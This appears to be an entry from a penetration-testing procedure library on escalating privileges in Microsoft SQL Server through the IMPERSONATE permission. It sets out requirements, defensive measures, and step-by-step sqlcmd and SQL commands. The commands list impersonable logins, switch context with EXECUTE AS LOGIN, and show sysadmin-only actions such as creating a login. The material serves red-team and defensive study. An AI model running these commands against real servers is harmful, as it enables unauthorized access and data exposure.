---
id: 6585eb03-ef7f-43f0-a2c6-71c62dbf999a
name: SQL-Server-Impersonation-Privilege-Escalation
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:21.013905+00:00'
updated_at: '2023-04-10T20:36:39.928368+00:00'
tactics:
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - >-
    [[techniques/Exploitation for Privilege Escalation|T1068 - Exploitation for
    Privilege Escalation]]
sub_techniques: []
tags:
  - mssql
  - sql-server
  - privilege-escalation
  - impersonation
commands:
  - '[[commands/sqlcmd-list-impersonable-principals]]'
  - '[[commands/sqlcmd-impersonate-login]]'
platforms:
  - Windows
  - SQL Server
tools: []
validated: true
---

# SQL-Server-Impersonation-Privilege-Escalation

## Summary

This procedure identifies SQL Server logins that the current user can impersonate, allowing privilege escalation by assuming the identity of a higher-privileged account, such as a sysadmin. It is useful in post-exploitation scenarios where initial access to a low-privileged SQL login is obtained, enabling attackers to perform unauthorized actions like data access or further system compromise.

## Description

SQL Server's IMPERSONATE permission allows a principal to act as another login or user, potentially escalating privileges if the impersonated account has elevated rights (e.g., sysadmin role). This technique targets server-level permissions and is effective in environments with misconfigured access controls. The procedure assumes connection via a tool like sqlcmd and requires executing queries within the SQL Server instance. Success leads to temporary elevation, allowing actions like querying sensitive data or enabling additional features. This maps to exploitation of database misconfigurations for privilege escalation in Windows-based environments hosting SQL Server.

## Requirements

1. Valid low-privileged credentials for the SQL Server instance (e.g., username and password).
2. Network access to the SQL Server port (default TCP 1433).
3. sqlcmd tool installed on the attacker's machine or accessible shell.
4. The current login must have IMPERSONATE permission on target logins.

## Defense

- Limit IMPERSONATE permissions to only necessary principals and regularly audit server permissions using sys.server_permissions.
- Enable SQL Server auditing for permission grants and impersonation events.
- Implement least privilege principles, revoking unnecessary server roles from service accounts.
- Monitor SQL logs for EXECUTE AS statements and unusual privilege escalations.

## Objectives

1. Identify logins that can be impersonated by the current user.
2. Impersonate a high-privileged login to escalate access.
3. Verify elevated privileges by performing a restricted action.

## Instructions

### Step 1: List Impersonable Server Principals

**Context**: Query the SQL Server system views to find server principals (logins) that the current user has permission to impersonate. This reveals potential targets for escalation, such as the 'sa' login or other sysadmin accounts.

**Command** ([[commands/sqlcmd-list-impersonable-principals]]):
```bash
sqlcmd -S $_SERVER -U $_USERNAME -P $_PASSWORD -Q "select distinct b.name from sys.server_permissions a inner join sys.server_principals b on a.grantor_principal_id = b.principal_id where a.permission_name = 'impersonate'"
```

> This command connects to the SQL Server instance and executes the query to list impersonable logins. Look for high-privilege accounts like 'sa' or custom admin logins in the output.

### Step 2: Impersonate a Target Login

**Context**: Once a suitable login is identified (e.g., one with sysadmin role), use the EXECUTE AS LOGIN statement to switch context. This allows performing actions as the impersonated user without changing the actual connection credentials.

**Command** ([[commands/sqlcmd-impersonate-login]]):
```bash
sqlcmd -S $_SERVER -U $_USERNAME -P $_PASSWORD -Q "EXECUTE AS LOGIN = '$_TARGET_LOGIN'; SELECT SUSER_NAME(); REVERT;"
```

> Replace $_TARGET_LOGIN with a name from Step 1. The query impersonates the login, confirms the current user with SUSER_NAME(), and reverts to avoid session issues. If successful, SUSER_NAME() will show the target login during impersonation.

### Step 3: Verify Escalation and Perform Elevated Action

**Context**: With impersonation active, test elevated privileges by attempting a sysadmin-only action, such as creating a new login or querying restricted data. Revert afterward to end the impersonation.

**Instructions**: In a persistent session (e.g., via SSMS or repeated sqlcmd), run:
```sql
EXECUTE AS LOGIN = '$_TARGET_LOGIN';
-- Example elevated action: CREATE LOGIN testuser WITH PASSWORD = 'P@ssw0rd';
SELECT * FROM sys.dm_exec_sessions WHERE is_user_process = 1;
REVERT;
```

> This demonstrates escalation by creating a login (sysadmin privilege) or listing sessions. Success is indicated by no permission errors and the action completing as the impersonated user. Clean up any test artifacts post-escalation.
